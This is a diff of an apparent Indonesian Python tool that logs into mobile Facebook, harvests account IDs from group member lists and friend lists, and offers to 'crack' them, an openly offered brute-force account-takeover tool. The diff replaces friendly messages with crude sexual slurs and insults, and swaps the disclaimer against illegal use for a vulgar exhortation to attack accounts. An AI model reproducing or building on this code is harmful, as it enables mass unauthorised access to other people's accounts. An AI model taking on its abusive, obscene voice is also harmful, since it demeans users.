@@ -52,7 +52,7 @@ def inputD(x,v=0):
 			if a.upper() in v:
 				break
 			else:
-				tampil('\rm[!]Masukan Opsinya Bro...')
+				tampil('\rm[!]Masukan Opsinya NJEENG...')
 				continue
 		else:
 			if len(a) == 0:
@@ -117,10 +117,10 @@ def login():
 		buka('https://mobile.facebook.com/home.php')
 		nama = br.find_link(url_regex='logout.php').text
 		nama = re.findall(r'\((.*a?)\)',nama)[0]
-		tampil('\rh[*]Selamat datang \rk%s\n\rh[*]Semoga ini adalah hari keberuntungan mu....'%nama)
+		tampil('\rh[*]Selamat COEG \rk%s\n\rh[*]Semoga ini adalah hari keberuntungan LU....'%nama)
 		log = 1
 	elif 'checkpoint' in url:
-		tampil('\rm[!]Akun kena checkpoint\n\rk[!]Coba Login dengan opera mini')
+		tampil('\rm[!]MAMPUS kena checkpoint\n\rk[!]Coba Login dengan opera mini')
 		keluar()
 	else:
 		tampil('\rm[!]Login Gagal')
@@ -141,21 +141,21 @@ def saring_id_group0():
 	global id_group
 	while 1:
 		id_group = inputD('[?]Id Group')
-		tampil('\rh[*]Mengecek Group....')
+		tampil('\rh[*]NGINTIP MEMEKNYA....')
 		a = buka('https://m.facebook.com/browse/group/members/?id='+id_group+'&amp;start=0&amp;listType=list_nonfriend&amp;refid=18&amp;_rdc=1&amp;_rdr')
 		nama = ' '.join(re.findall(r'<title>(.*?)</title>',a)[0].split()[1:])
 		try:
 			next = br.find_link(url_regex= '/browse/group/members/').url
 			break
 		except:
-			tampil('\rm[!]Id yang anda masukan salah')
+			tampil('\rm[!]Id LU masukan salah NJENG')
 			continue
-	tampil('\rh[*]Mengambil Id dari group \rc%s'%nama)
+	tampil('\rh[*]BAJAK Id dari group \rc%s'%nama)
 	saring_id_group1(a)
 	return next
 def idgroup():
 	if log != 1:
-		tampil('\rh[*]Login dulu bos...')
+		tampil('\rh[*]Login dulu GOBLOG...')
 		login()
 		if log == 0:
 			keluar()
@@ -165,7 +165,7 @@ def idgroup():
 		try:
 			next = br.find_link(url_regex= '/browse/group/members/').url
 		except:
-			tampil('\rm[!]Hanya Bisa Mengambil \rh %d id'%len(id_bgroup))
+			tampil('\rm[!]Hanya Bisa NGENTOT \rh %d id'%len(id_bgroup))
 			break
 	simpan()
 	i = inputD('[?]Langsung Crack (y/t)',['Y','T'])
@@ -175,7 +175,7 @@ def idgroup():
 		return menu()
 def idteman():
 	if log != 1:
-		tampil('\rh[*]Login dulu bos...')
+		tampil('\rh[*]Login dulu GOBLOG...')
 		login()
 		if log == 0:
 			keluar()
@@ -184,7 +184,7 @@ def idteman():
 		next = br.find_link(url_regex= 'friends_center_main').url
 	except:
 		if len(id_teman) != 0:
-			tampil('\rm[!]Hanya dapat mengambil \rp%d id'%len(id_bteman))
+			tampil('\rm[!]Hanya dapat NGENTOT \rp%d id'%len(id_bteman))
 		else:
 			tampil('\rm[!]Batal')
 			keluar()
@@ -193,7 +193,7 @@ def idteman():
 		try:
 			next = br.find_link(url_regex= 'friends_center_main').url
 		except:
-			tampil('\rm[!]Hanya dapat mengambil \rp%d id'%len(id_bteman))
+			tampil('\rm[!]Hanya dapat NGENTOT \rp%d id'%len(id_bteman))
 			break
 	simpan()
 	i = inputD('[?]Langsung Crack (y/t)',['Y','T'])
@@ -326,24 +326,23 @@ def lanjutG():
 			fid_bgroup = []
 	return 0
 def menu():
-	tampil('''\rh
+	tampil('''\rm
                      .-.-..
                     /+/++//
                    /+/++//
-            \rk*   *\rh /+/++//
+            \rk*   *\rm /+/++//
              \ /  |/__//
-           {\rmX\rh}v{\rmX\rh}|\rcPRX\rh|==========.
+           {\rmX\rm}v{\rmX\rm}|\rcXXX\rm|==========.
              [']  /'|'\           \\
                  /  \  \           '
-                 \_  \_ \_    \rk*\rhClarisha Octa
-\rk###########################################################
+                 \_  \_ \_    \rk*\rhClarishaOcta
+\rc☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠
 #             \rb*MULTY BRUTEFORCE FACEBOOK*\rk                 #
 # \rhBY\rp                                             Clarisha Octa \rk#
 # \rhGroup FB\rp  https://m.facebook.com/groups/164201767529837 \rk#
-# \rhGitHub\rp                      https://github.com/Clarisha/brute.git \rk#
-#       \rmDo Not Use This Tool For IllegaL Purpose          \rk#
-###########################################################''')
-	tampil('''\rk%s\n\rc1 \rhAmbil id dari group\n\rc2 \rhAmbil id dari daftar teman\n\rc3 \rmKELUAR\n\rk%s'''%('#'*20,'#'*20))
+# \rhGitHub\rp                      https://github.com/Clarisha/mbf.git \rk#
+#       \rmJANGAN LUPA KONTOL KONTOLIN FB NYA          \rc☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠#☠''')
+	tampil('''\rk%s\n\rc1 \rhcroot id dari group\n\rc2 \rbcroot id dari daftar teman\n\rc3 \rmMUNCRAAT\n\rc%s'''%('#'*20,'#'*20))
 	i = inputM('[?]PILIH',[1,2,3])
 	if i == 1:
 		lanjutG()
